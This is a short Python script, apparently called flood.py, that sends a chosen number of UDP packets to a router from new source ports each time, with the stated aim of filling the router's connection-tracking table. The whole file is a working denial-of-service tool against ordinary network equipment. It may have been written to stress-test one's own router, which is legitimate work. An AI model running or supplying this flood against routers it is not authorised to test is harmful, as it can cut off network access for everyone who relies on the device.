#!/usr/bin/env python3
"""Fill a router's connection table from this machine: N UDP packets to the
router, each from a new source port, so each one is a new tracked flow (an
unreplied UDP flow stays in the table for nf_conntrack_udp_timeout, 30-60 s).

    flood.py <router-ip> <count> [<local-ip>]
"""
import socket
import sys


def main() -> None:
    router, count = sys.argv[1], int(sys.argv[2])
    local = sys.argv[3] if len(sys.argv) > 3 else ''
    for i in range(count):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((local, 0))
        # High ports nothing listens on; the router answers with ICMP or not at all.
        s.sendto(b'x', (router, 40000 + i % 20000))
        s.close()


if __name__ == '__main__':
    main()
